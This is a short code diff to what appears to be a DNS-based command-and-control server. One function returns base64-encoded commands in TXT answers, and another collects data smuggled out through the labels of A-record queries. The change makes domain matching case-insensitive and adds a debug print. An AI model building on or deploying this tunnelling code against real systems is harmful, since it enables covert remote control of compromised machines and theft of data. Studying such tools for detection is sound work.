@@ -104,7 +104,7 @@ def sendData(code,counter,command):
         rawrequest, addr = s.recvfrom(1024)
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
-        if(query["query_type"] == "TXT" and query["domain_name"] == f"{counter}.{code}.{settings['domain']}."):
+        if(query["query_type"] == "TXT" and query["domain_name"].lower() == f"{counter}.{code}.{settings['domain']}.".lower()):
             # Build response with command
             command = base64_encode_string(command)
             response = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)
@@ -113,6 +113,8 @@ def sendData(code,counter,command):
             response.add_answer(RR(rname=request.q.qname, rtype=QTYPE.TXT, rclass=1, ttl=TTL, rdata=rdata))
             s.sendto(b'%s' % response.pack(), addr)
             return;
+        else:
+            print(f"No valid query: {query["domain_name"]}")
 
 
 def getData(code,counter):
@@ -124,7 +126,7 @@ def getData(code,counter):
         request = DNSRecord.parse(rawrequest)
         query = parseRequest(request, addr)
         #print(f"Request from: {query['ip_address']} for {query['domain_name']} type {query['query_type']}")
-        if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{settings['domain']}."):
+        if query["query_type"] == "A" and query["domain_name"].lower().endswith(f"{code}-{counter}.{settings['domain']}.".lower()):
             thisdata = query["domain_parts"]
 
             if not thisdata[3] in data:
